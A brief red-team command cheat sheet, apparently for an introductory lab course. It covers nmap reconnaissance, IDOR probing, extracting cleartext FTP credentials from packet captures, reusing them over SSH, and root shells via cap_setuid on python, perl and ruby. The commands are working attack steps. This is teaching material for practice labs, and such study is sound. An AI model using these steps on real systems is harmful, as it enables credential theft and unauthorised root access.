# Command Cheatsheet — Intro To Red Team

| Phase | Command | Purpose |
|-------|---------|---------|
| Recon | `nmap -sV -sC <ip>` | Service + default-script scan |
| Recon | `nmap -p- --min-rate=2000 <ip>` | Full TCP port sweep |
| Web | `curl -s http://<ip>/<path>` | Inspect endpoints / probe IDOR ids |
| Loot | `tshark -r file.pcap -Y ftp` | Extract FTP (cleartext) creds from a capture |
| Loot | `strings file.pcap \| grep -iE 'USER\|PASS'` | pcap cred grep when tshark is unavailable |
| Access | `ssh <user>@<ip>` | Reuse harvested creds for a shell |
| Privesc | `getcap -r / 2>/dev/null` | Enumerate file capabilities |

## Privesc — Linux capabilities (`cap_setuid`)

If `getcap -r /` shows **`cap_setuid`** on an interpreter, you can set your UID to 0 and spawn a root shell.

```bash
# Enumerate
getcap -r / 2>/dev/null
# e.g. /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

# Abuse (Cap box)
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id   # uid=0(root)
```

Same idea for other binaries carrying `cap_setuid` (see GTFOBins):
```bash
# perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
# ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```
